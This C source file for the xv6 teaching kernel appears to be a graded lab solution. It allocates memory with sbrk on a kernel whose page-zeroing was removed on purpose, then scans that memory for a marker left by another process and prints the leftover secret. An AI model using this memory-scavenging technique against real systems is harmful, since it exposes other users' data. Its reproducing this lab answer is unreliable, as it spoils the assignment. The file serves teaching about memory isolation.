#include "kernel/types.h"   // Basic xv6 type definitions (uint, etc.)
#include "user/user.h"      // User-level system calls (sbrk, printf, exit, strlen, memcmp)

// We define how much memory to scan.
// 64 pages × 4096 bytes per page = 262144 bytes.
// We request a large area to increase the chance of reusing
// the same physical pages that were previously used by secret.c.
#define SEARCH_SIZE (64*4096)

int
main(int argc, char *argv[])
{
  // ------------------------------------------------------------
  // Step 1: Allocate memory using sbrk().
  //
  // Normally, xv6 clears newly allocated pages with memset().
  // However, in this lab, that memset() call is intentionally removed.
  //
  // This means the memory returned by sbrk() may still contain
  // leftover ("dirty") data from a previously terminated process.
  //
  // If secret.c ran earlier, its secret string may still be
  // present inside these physical pages.
  // ------------------------------------------------------------
  char *data = sbrk(SEARCH_SIZE);
  
  // Check if memory allocation failed.
  // sbrk() returns (char*)-1 on failure.
  if (data == (char*)-1) {
    printf("sbrk failed\n");
    exit(1);
  }

  // ------------------------------------------------------------
  // Step 2: Define the marker (anchor) string.
  //
  // In secret.c, the program stores:
  //    "This may help."
  //
  // followed by the actual secret argument.
  //
  // We search for this known marker to locate where
  // the secret is stored in memory.
  // ------------------------------------------------------------
  char *marker = "This may help.";
  int marker_len = strlen(marker);

  // ------------------------------------------------------------
  // Step 3: Scan the allocated memory byte by byte.
  //
  // We iterate through the entire allocated region looking
  // for the marker string.
  //
  // We stop 64 bytes before the end to prevent reading past
  // allocated memory, which would cause a page fault
  // (RISC-V scause 0xd error).
  // ------------------------------------------------------------
  for (int i = 0; i < SEARCH_SIZE - 64; i++) {
    
    // Compare memory starting at &data[i]
    // with our marker string.
    //
    // memcmp() returns 0 if the memory matches exactly.
    if (memcmp(&data[i], marker, marker_len) == 0) {
      
      // --------------------------------------------------------
      // Step 4: Locate the secret.
      //
      // In secret.c, the secret string was copied to:
      //
      //    data + 16
      //
      // meaning it starts 16 bytes after the marker.
      //
      // So once we find the marker at index i,
      // the secret should be at (i + 16).
      // --------------------------------------------------------
      char *secret_candidate = &data[i + 16];

      // --------------------------------------------------------
      // Step 5: Filter out junk values.
      //
      // Because memory reuse is unpredictable,
      // we may find partial matches or garbage.
      //
      // We check whether the first character is printable.
      //
      // Printable ASCII range:
      //    '!' (33) to '~' (126)
      //
      // This avoids printing "(null)" or invalid memory.
      // --------------------------------------------------------
      if (secret_candidate[0] >= '!' && secret_candidate[0] <= '~') {
          
          // Print the recovered secret.
          // The grading script expects ONLY the secret
          // printed on its own line.
          printf("%s\n", secret_candidate);

          // Exit immediately after finding the secret.
          exit(0); 
      }
    }
  }

  // If no secret was found in the scanned memory,
  // exit normally.
  exit(0);
}